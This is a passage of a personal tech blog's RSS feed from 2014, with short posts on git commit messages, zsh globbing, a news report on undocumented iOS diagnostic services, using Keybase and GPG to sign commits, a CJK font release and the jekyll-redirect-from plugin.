&lt;img src=&quot;/images/2014/09/21/de7ec7.svg&quot; alt=&quot;#de7ec7&quot; title=&quot;#de7ec7&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/deadbeef.svg&quot; alt=&quot;#deadbeef&quot; title=&quot;#deadbeef&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/dec0de.svg&quot; alt=&quot;#dec0de&quot; title=&quot;#dec0de&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/defea7.svg&quot; alt=&quot;#defea7&quot; title=&quot;#defea7&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/defec7.svg&quot; alt=&quot;#defec7&quot; title=&quot;#defec7&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/defec7ed.svg&quot; alt=&quot;#defec7ed&quot; title=&quot;#defec7ed&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/ea7.svg&quot; alt=&quot;#ea7&quot; title=&quot;#ea7&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/effec7.svg&quot; alt=&quot;#effec7&quot; title=&quot;#effec7&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/f007ba11.svg&quot; alt=&quot;#f007ba11&quot; title=&quot;#f007ba11&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/f01ded.svg&quot; alt=&quot;#f01ded&quot; title=&quot;#f01ded&quot;&gt;
&lt;img src=&quot;/images/2014/09/21/faceb00c.svg&quot; alt=&quot;#faceb00c&quot; title=&quot;#faceb00c&quot;&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 21 Sep 2014 05:59:49 +0900</pubDate>
        <link>http://yous.be/2014/09/21/yet-another-hex-word/</link>
        <guid isPermaLink="true">http://yous.be/2014/09/21/yet-another-hex-word/</guid>
        
        
        <category>Design</category>
        
      </item>
    
      <item>
        
        <title>How to Write a Git Commit Message &amp;rarr;</title>
        
        <description>&lt;p&gt;&lt;a href=&quot;http://xkcd.com/1296/&quot;&gt;&lt;img src=&quot;http://imgs.xkcd.com/comics/git_commit.png&quot; alt=&quot;Git Commit&quot; title=&quot;Git Commit&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;h2&gt;The seven rules of a great git commit message&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;Keep in mind: &lt;a href=&quot;http://tbaggery.com/2008/04/19/a-note-about-git-commit-messages.html&quot;&gt;This&lt;/a&gt; &lt;a href=&quot;http://www.git-scm.com/book/en/Distributed-Git-Contributing-to-a-Project#Commit-Guidelines&quot;&gt;has&lt;/a&gt; &lt;a href=&quot;https://github.com/torvalds/subsurface/blob/master/README#L82-109&quot;&gt;all&lt;/a&gt; &lt;a href=&quot;http://who-t.blogspot.co.at/2009/12/on-commit-messages.html&quot;&gt;been&lt;/a&gt; &lt;a href=&quot;https://github.com/erlang/otp/wiki/writing-good-commit-messages&quot;&gt;said&lt;/a&gt; &lt;a href=&quot;https://github.com/spring-projects/spring-framework/blob/30bce7/CONTRIBUTING.md#format-commit-messages&quot;&gt;before&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://chris.beams.io/posts/git-commit/#separate&quot;&gt;Separate subject from body with a blank line&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://chris.beams.io/posts/git-commit/#limit-50&quot;&gt;Limit the subject line to 50 characters&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://chris.beams.io/posts/git-commit/#capitalize&quot;&gt;Capitalize the subject line&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://chris.beams.io/posts/git-commit/#end&quot;&gt;Do not end the subject line with a period&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://chris.beams.io/posts/git-commit/#imperative&quot;&gt;Use the imperative mood in the subject line&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://chris.beams.io/posts/git-commit/#wrap-72&quot;&gt;Wrap the body at 72 characters&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://chris.beams.io/posts/git-commit/#why-not-how&quot;&gt;Use the body to explain &lt;em&gt;what&lt;/em&gt; and &lt;em&gt;why&lt;/em&gt; vs. &lt;em&gt;how&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
</description>
        <pubDate>Wed, 03 Sep 2014 22:12:47 +0900</pubDate>
        <link>http://yous.be/2014/09/03/how-to-write-a-git-commit-message/</link>
        <guid isPermaLink="true">http://yous.be/2014/09/03/how-to-write-a-git-commit-message/</guid>
        
        
        <category>Git</category>
        
      </item>
    
      <item>
        
        <title>zsh: no matches found &amp;rarr;</title>
        
        <description>&lt;p&gt;With the use of &lt;a href=&quot;http://www.git-scm.com&quot;&gt;Git&lt;/a&gt; or &lt;a href=&quot;http://octopress.org&quot;&gt;Octopress&lt;/a&gt; (typically &lt;a href=&quot;https://github.com/ruby/rake&quot;&gt;Rake&lt;/a&gt;), we type &lt;code&gt;[&lt;/code&gt;, &lt;code&gt;]&lt;/code&gt;, &lt;code&gt;^&lt;/code&gt; characters to terminal:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;git reset HEAD^
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;rake install[classic]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Some &lt;a href=&quot;http://www.zsh.org&quot;&gt;Zsh&lt;/a&gt; users know what would happen when we type that commands:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;zsh: no matches found: HEAD^
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;zsh: no matches found: install[classic]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This is caused by Zsh:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;zsh allows Filename Generation and Pattern Matching (Globbing) using square brackets and other characters (explained in the &lt;a href=&quot;http://zsh.sourceforge.net/Guide/zshguide05.html&quot;&gt;zsh guide&lt;/a&gt;, section 5.9).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The solution is simple:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The solution, found in the &lt;a href=&quot;http://zsh.sourceforge.net/FAQ/zshfaq03.html&quot;&gt;zsh FAQ&lt;/a&gt; (section 3.4), is simply adding a line in ~/.zshrc that disables globbing for a single command:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rake&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;noglob rake&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Aliasing &lt;code&gt;git&lt;/code&gt; is also useful:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;git&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;noglob git&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        <pubDate>Tue, 05 Aug 2014 14:31:03 +0900</pubDate>
        <link>http://yous.be/2014/08/05/zsh-no-matches-found/</link>
        <guid isPermaLink="true">http://yous.be/2014/08/05/zsh-no-matches-found/</guid>
        
        
        <category>Zsh</category>
        
      </item>
    
      <item>
        
        <title>Undocumented iOS functions allow monitoring of personal data, expert says &amp;rarr;</title>
        
        <description>&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;Backdoor&amp;rdquo; can be abused by gov&amp;rsquo;t agents and ex-lovers to gain persistent access.&lt;/p&gt;

&lt;p&gt;Apple has endowed iPhones with undocumented functions that allow unauthorized people in privileged positions to wirelessly connect and harvest pictures, text messages, and other sensitive data without entering a password or PIN, a forensic scientist warned over the weekend.&lt;/p&gt;

&lt;p&gt;Zdziarski said the service that raises the most concern is known as com.apple.mobile.file_relay. It dishes out a staggering amount of data&amp;mdash;including account data for e-mail, Twitter, iCloud, and other services, a full copy of the address book including deleted entries, the user cache folder, logs of geographic positions, and a complete dump of the user photo album&amp;mdash;all without requiring a backup password to be entered. He said two other services dubbed com.apple.pcapd and com.apple.mobile.house_arrest may have legitimate uses for app developers or support people but can also be used to spy on users by government agencies or even jilted ex-lovers. The Pcapd service, for instance, allows people to wirelessly monitor all network traffic traveling into and out of the device, even when it&amp;rsquo;s not running in a special developer or support mode. House_arrest, meanwhile, allows the copying of sensitive files and documents from Twitter, Facebook, and many other applications.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://cdn.arstechnica.net/wp-content/uploads/2014/07/pcapd1.jpg&quot; alt=&quot;com.apple.pcapd&quot; title=&quot;com.apple.pcapd&quot;&gt;&lt;/p&gt;

&lt;p&gt;Slides of Zdziarski&amp;rsquo;s talk, titled &lt;strong&gt;Identifying Back Doors, Attack Points, and Surveillance Mechanisms in iOS Devices&lt;/strong&gt; are &lt;a href=&quot;http://www.zdziarski.com/blog/wp-content/uploads/2014/07/iOS_Backdoors_Attack_Points_Surveillance_Mechanisms.pdf&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Also check the page about &lt;a href=&quot;http://support.apple.com/kb/HT6331&quot;&gt;iOS: About diagnostic capabilities&lt;/a&gt; on Apple Support:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Each of these diagnostic capabilities requires the user to have unlocked their device and agreed to trust another computer. Any data transmitted between the iOS device and trusted computer is encrypted with keys not shared with Apple. For users who have enabled iTunes Wi-Fi Sync on a trusted computer, these services may also be accessed wirelessly by that computer.&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        <pubDate>Tue, 22 Jul 2014 22:19:14 +0900</pubDate>
        <link>http://yous.be/2014/07/22/undocumented-ios-functions-allow-monitoring-of-personal-data-expert-says/</link>
        <guid isPermaLink="true">http://yous.be/2014/07/22/undocumented-ios-functions-allow-monitoring-of-personal-data-expert-says/</guid>
        
        
        <category>iOS</category>
        
      </item>
    
      <item>
        
        <title>Using Keybase</title>
        
        <description>&lt;h2&gt;&lt;a id=&quot;keybase&quot;&gt;&lt;/a&gt;Keybase&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://keybase.io/images/logo.png&quot; alt=&quot;Keybase&quot; title=&quot;Keybase&quot;&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Keybase will be a public directory of publicly auditable public keys. All paired, for convenience, with unique usernames.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I just created my &lt;a href=&quot;https://keybase.io&quot;&gt;Keybase&lt;/a&gt;. You can see my PGP public key on &lt;a href=&quot;https://keybase.io/yous&quot;&gt;keybase.io/yous&lt;/a&gt; and get the key via &lt;code&gt;https://keybase.io/yous/key.asc&lt;/code&gt;. Anyone can encrypt messages using my public key and then I could decrypt it using my private key and see the message with safety. All of these can be done in browser, in &lt;a href=&quot;https://keybase.io&quot;&gt;Keybase&lt;/a&gt;.&lt;/p&gt;

&lt;h2&gt;&lt;a id=&quot;keybase-proof&quot;&gt;&lt;/a&gt;Keybase Proof&lt;/h2&gt;

&lt;p&gt;Keybase provides several ways to prove own identity of a Twitter account, a GitHub account, websites and a bitcoin address. Still it can be done on the browser, also you can use &lt;a href=&quot;https://keybase.io/docs/command_line&quot;&gt;command line&lt;/a&gt; for it. I proved &lt;a href=&quot;https://github.com/yous&quot;&gt;my GitHub&lt;/a&gt; by &lt;a href=&quot;https://gist.github.com/yous/149b0775d2ff02eac323&quot;&gt;keybase.md&lt;/a&gt; and &lt;a href=&quot;http://yous.be&quot;&gt;this site&lt;/a&gt; by &lt;a href=&quot;http://yous.be/keybase.txt&quot;&gt;keybase.txt&lt;/a&gt;. Also you can check it with command line like:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;keybase id yous
✔ public key fingerprint: 1BF1 AFE8 682E 45A2 11FF 2C0E 891B 7A9E 1D5A 400A
✔ &lt;span class=&quot;s2&quot;&gt;&quot;yous&quot;&lt;/span&gt; on github: https://gist.github.com/149b0775d2ff02eac323
✔ admin of yous.be via HTTP: http://yous.be/keybase.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;!-- more --&gt;

&lt;h2&gt;&lt;a id=&quot;directory-signing&quot;&gt;&lt;/a&gt;Directory Signing&lt;/h2&gt;

&lt;p&gt;Command line program of Keybase provides &lt;code&gt;dir&lt;/code&gt; command to sign or verify directory. First you should install command line, see the &lt;a href=&quot;https://keybase.io/docs/command_line/installation&quot;&gt;installation docs&lt;/a&gt;. If you already have an account, just run &lt;code&gt;keybase login&lt;/code&gt;. You can also signup with &lt;code&gt;keybase signup&lt;/code&gt; in terminal.&lt;/p&gt;

&lt;p&gt;At first, you should change directory to sign:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Dropbox/Public
~/Dropbox/Public &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;keybase dir sign
info: Success! Wrote SIGNED.md from 224 found items
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;then &lt;code&gt;~/Dropbox/Public/SIGNED.md&lt;/code&gt; is generated. On same directory, veryfing directory is also possible with:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;~/Dropbox/Public &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;keybase dir verify
info: Valid signature from keybase user yous
✔ public key fingerprint: 1BF1 AFE8 682E 45A2 11FF 2C0E 891B 7A9E 1D5A 400A
✔ &lt;span class=&quot;s2&quot;&gt;&quot;yous&quot;&lt;/span&gt; on github: https://gist.github.com/149b0775d2ff02eac323
✔ admin of yous.be via HTTP: http://yous.be/keybase.txt
info: Signed 4 minutes ago &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Fri Jul 18 2014 20:06:31 GMT+0900 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;KST&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
info: Success! 1 signature&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; verified; 224 items checked
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;a id=&quot;using-custom-email&quot;&gt;&lt;/a&gt;Using Custom Email&lt;/h2&gt;

&lt;p&gt;When you create public key on &lt;a href=&quot;https://keybase.io&quot;&gt;Keybase&lt;/a&gt;, default UID has name as &lt;code&gt;keybase.io/&amp;lt;username&amp;gt;&lt;/code&gt; and email as &lt;code&gt;&amp;lt;username&amp;gt;@keybase.io&lt;/code&gt;. You can add UID with your real name and regular email. From &lt;a href=&quot;http://superuser.com/questions/293184/one-gnupg-pgp-key-pair-two-emails&quot;&gt;One GnuPG/PGP key pair, two emails?&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;gpg --edit-key &amp;lt;username&amp;gt;@keybase.io
&lt;span class=&quot;gp&quot;&gt;gpg&amp;gt; &lt;/span&gt;adduid
Real name: &amp;lt;name&amp;gt;
Email address: &amp;lt;email&amp;gt;
Comment: &amp;lt;comment or Return to none&amp;gt;
Change &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;ame, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;omment, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;E&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;mail or &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;O&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;kay/&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Q&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;uit? o
Enter passphrase: &amp;lt;passphrase&amp;gt;
&lt;span class=&quot;gp&quot;&gt;gpg&amp;gt; &lt;/span&gt;uid &amp;lt;uid&amp;gt;
&lt;span class=&quot;gp&quot;&gt;gpg&amp;gt; &lt;/span&gt;trust
Your decision? 5
Do you really want to &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;this key to ultimate trust? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y/N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; y
&lt;span class=&quot;gp&quot;&gt;gpg&amp;gt; &lt;/span&gt;save
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;a id=&quot;signing-commits&quot;&gt;&lt;/a&gt;Signing Commits&lt;/h2&gt;

&lt;p&gt;All the crypto of Keybase is performed with GPG, you can sign your tags and your commits. To setup your signing key, you need to get your key id by:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;gpg --list-secret-keys | grep &lt;span class=&quot;s2&quot;&gt;&quot;^sec&quot;&lt;/span&gt;
sec   4096R/1D5A400A 2014-07-16
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;1D5A400A&lt;/code&gt; part is your key id. Then simply you can set your signing key by:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;git config --global user.signingkey 1D5A400A
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Also&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;git config --global commit.gpgsign &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;makes Git to sign every commits:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;mkdir tmp &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;tmp
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;git init
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;foo &amp;gt; foo
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;git add foo
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;git commit -m &lt;span class=&quot;s2&quot;&gt;&quot;Test commit of foo&quot;&lt;/span&gt;

You need a passphrase to unlock the secret key &lt;span class=&quot;k&quot;&gt;for
&lt;/span&gt;user: &lt;span class=&quot;s2&quot;&gt;&quot;John Doe &amp;lt;john.doe@example.com&amp;gt;&quot;&lt;/span&gt;
2048-bit RSA key, ID E79FBC2D, created 2014-07-16 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main key ID 1D5A400A&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;master &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root-commit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 6cdfc26] Test commit of foo
 1 file changed, 1 insertion&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 create mode 100644 foo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;After adding signed commits, you can see the signature of commits by using &lt;code&gt;--show-signature&lt;/code&gt; option:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;git log --show-signature
commit 6cdfc26eb2273fed14181fe4a09b6240323b8930
gpg: Signature made 금  7/18 21:29:24 2014 KST using RSA key ID E79FBC2D
gpg: Good signature from &lt;span class=&quot;s2&quot;&gt;&quot;John Doe &amp;lt;john.doe@example.com&amp;gt;&quot;&lt;/span&gt;
gpg:                 aka &lt;span class=&quot;s2&quot;&gt;&quot;keybase.io/jdoe &amp;lt;jdoe@keybase.io&amp;gt;&quot;&lt;/span&gt;
Author: John Doe &amp;lt;john.doe@example.com&amp;gt;
Date:   Fri Jul 18 21:29:14 2014 +0900

    Test commit of foo

 foo | 1 +
 1 file changed, 1 insertion&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;For more information, see &lt;a href=&quot;http://mikegerwitz.com/papers/git-horror-story&quot;&gt;A Git Horror Story: Repository Integrity With Signed Commits&lt;/a&gt; by Mike Gerwitz.&lt;/p&gt;

&lt;h2&gt;&lt;a id=&quot;contact-me&quot;&gt;&lt;/a&gt;Contact Me&lt;/h2&gt;

&lt;p&gt;So, now feel free to contact me via &lt;a href=&quot;https://keybase.io/yous&quot;&gt;keybase.io/yous&lt;/a&gt; and other &lt;a href=&quot;/about&quot;&gt;contacts&lt;/a&gt;. The source of this site is available on &lt;a href=&quot;https://github.com/yous/yous.github.io&quot;&gt;GitHub&lt;/a&gt;, forks and pull requests are welcome!&lt;/p&gt;
</description>
        <pubDate>Fri, 18 Jul 2014 03:21:09 +0900</pubDate>
        <link>http://yous.be/2014/07/18/using-keybase/</link>
        <guid isPermaLink="true">http://yous.be/2014/07/18/using-keybase/</guid>
        
        
        <category>Technology</category>
        
      </item>
    
      <item>
        
        <title>Introducing Source Han Sans: An open source Pan-CJK typeface &amp;rarr;</title>
        
        <description>&lt;blockquote&gt;
&lt;p&gt;Adobe, in partnership with Google, is pleased to announce the release of &lt;a href=&quot;http://adobe.ly/TkSHS&quot;&gt;Source Han Sans&lt;/a&gt;, a new open source Pan-CJK typeface family that is now available on Typekit for desktop use.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://typekit.files.wordpress.com/2014/07/multi-language-sample-v3.jpg?w=800&amp;amp;h=408&quot; alt=&quot;Multi-language sample&quot; title=&quot;Multi-language sample&quot;&gt;&lt;/p&gt;

&lt;p&gt;More information on Google&amp;rsquo;s Noto Sans CJK family is available on their &lt;a href=&quot;http://goo.gl/yhFcim&quot;&gt;blog&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        <pubDate>Wed, 16 Jul 2014 16:04:27 +0900</pubDate>
        <link>http://yous.be/2014/07/16/introducing-source-han-sans-an-open-source-pan-cjk-typeface/</link>
        <guid isPermaLink="true">http://yous.be/2014/07/16/introducing-source-han-sans-an-open-source-pan-cjk-typeface/</guid>
        
        
        <category>Design</category>
        
      </item>
    
      <item>
        
        <title>Move to &#39;jekyll-redirect-from&#39;</title>
        
        <description>&lt;h2&gt;&lt;a id=&quot;problems-with-jekyll-alias-generator&quot;&gt;&lt;/a&gt;Problems with jekyll_alias_generator&lt;/h2&gt;

&lt;p&gt;I wrote &lt;a href=&quot;/2014/05/23/how-to-add-redirects-to-post-url-on-octopress/&quot;&gt;&amp;ldquo;How to Add Redirects to Post URL on Octopress&amp;rdquo;&lt;/a&gt; few month ago. Now &lt;a href=&quot;https://github.com/imathis/octopress/commit/72ea6042e33f0b92e4923c3af00e923f19472573&quot;&gt;Octopress is compatible&lt;/a&gt; with &lt;a href=&quot;http://jekyllrb.com&quot;&gt;Jekyll&lt;/a&gt; 2.0, and some plugins don&amp;rsquo;t seem to work. Current Octopress uses Jekyll &lt;a href=&quot;https://github.com/imathis/octopress/blob/4fdae37e4294618084f652c99c0c06ba7663ac07/Gemfile.lock#L26&quot;&gt;2.0.3&lt;/a&gt; and when I run &lt;code&gt;rake generate&lt;/code&gt;, I see an error:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;/path/to/jekyll/lib/jekyll/static_file.rb:40:in &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;stat&lt;span class=&quot;s1&quot;&gt;&#39;: Not a directory @ rb_file_s_stat - /path/to/generated/alias/index.html/ (Errno::ENOTDIR)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So I make &lt;a href=&quot;https://github.com/yous/jekyll_alias_generator/commit/7de96759bdd7a2c27fa2d4d603c6c1f585fd2abc&quot;&gt;this commit&lt;/a&gt;:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/30d45925d0b100052f6d.js&quot;&gt; &lt;/script&gt;

&lt;p&gt;But it seems that there is &lt;a href=&quot;https://github.com/tsmango/jekyll_alias_generator/issues/12&quot;&gt;another problem&lt;/a&gt; with latest Jekyll, so I make &lt;a href=&quot;https://github.com/yous/jekyll_alias_generator/commit/59a72029307a730014a020dcb3f73506f80ddab5&quot;&gt;another commit&lt;/a&gt;:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/ceb181878cf15b529e6d.js&quot;&gt; &lt;/script&gt;

&lt;p&gt;To say the result first, I had &lt;a href=&quot;https://github.com/yous/yous.github.io/commit/2cf44cbe21b499c89dc8ac68f6f170add52f9d6e&quot;&gt;no luck&lt;/a&gt;. The alias directories are generated, every &lt;code&gt;index.html&lt;/code&gt; file under each directory won&amp;rsquo;t. By looking at diff of &lt;code&gt;sitemap.xml&lt;/code&gt;, the plugin seems to generate wrong paths. I&amp;rsquo;m pretty newbie to Jekyll and how Octopress works with it. Also this is a plugin for Jekyll, not Octopress. So if you have any fix for this problem, please make pull requests to &lt;a href=&quot;https://github.com/tsmango/jekyll_alias_generator/pulls&quot;&gt;jekyll_alias_generator&lt;/a&gt; or just &lt;a href=&quot;/about/#contact&quot;&gt;contact me&lt;/a&gt;.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h2&gt;&lt;a id=&quot;jekyll-redirect-from&quot;&gt;&lt;/a&gt;jekyll-redirect-from&lt;/h2&gt;

&lt;p&gt;While searching how to fix this problem, I found &lt;a href=&quot;https://github.com/jekyll/jekyll-redirect-from&quot;&gt;jekyll-redirect-from&lt;/a&gt; served by Jekyll team. What it does is almost completely same with &lt;code&gt;jekyll_alias_generator&lt;/code&gt;. Generates alias HTML files when we set &lt;code&gt;redirect_from&lt;/code&gt; key in YAML front matter of the post.&lt;/p&gt;

&lt;p&gt;To use this plugin, install &lt;code&gt;jekyll-redirect-from&lt;/code&gt; gem by select one option from below:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Add &lt;code&gt;gem &amp;#39;jekyll-redirect-from&amp;#39;&lt;/code&gt; to &lt;code&gt;Gemfile&lt;/code&gt; and execute &lt;code&gt;bundle&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;gem install jekyll-redirect-from&lt;/code&gt; on terminal.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Then add it to your &lt;code&gt;_config.yml&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;s&quot;&gt;gems&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;jekyll-redirect-from&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ready to add redirects! You can use this by adding &lt;code&gt;redirect_from&lt;/code&gt; to the YAML front matter of your page or post:&lt;/p&gt;
